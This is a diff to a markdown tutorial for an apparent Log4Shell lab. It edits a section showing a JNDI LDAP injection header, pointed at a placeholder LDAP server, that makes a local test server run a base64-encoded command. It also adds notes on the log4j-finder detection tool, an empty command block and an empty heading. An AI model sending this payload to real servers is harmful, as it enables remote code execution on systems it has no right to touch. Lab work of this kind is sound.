@@ -101,9 +101,10 @@ For example the following command will add a file called `pwned` to the `/tmp` d
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
+> ℹ️ **NOTE** 
 > **NOTE:** This can also be used *BurpSuite* by adding the following line to the origal reqest: 
 > ```http
-> curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+> X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
 > ```
 
 Now you can execute any command you want. 
@@ -125,6 +126,16 @@ One of the best resources for *Log4J* is [`NCSC-NL/log4shell` GitHub Page](https
 We will be using 2 tools mentioned in this repository. 
 
 ### 1. [log4j-finder](https://github.com/fox-it/log4j-finder)
+
+[log4j-finder](https://github.com/fox-it/log4j-finder) "identifies `log4j2` libraries on your filesystem using a list of *known bad* and *known good* MD5 hashes of specific files". This means that it runs locally on the machine instead of scanning externally. To scan for the Log4J vulnerability, you will have to get into a termail of the docker container. While the container is running, use the following command: 
+
+```sh
+
+```
+
+## Log4J Vulnerable Code Explained
+
+
 
 ## Sources  
 
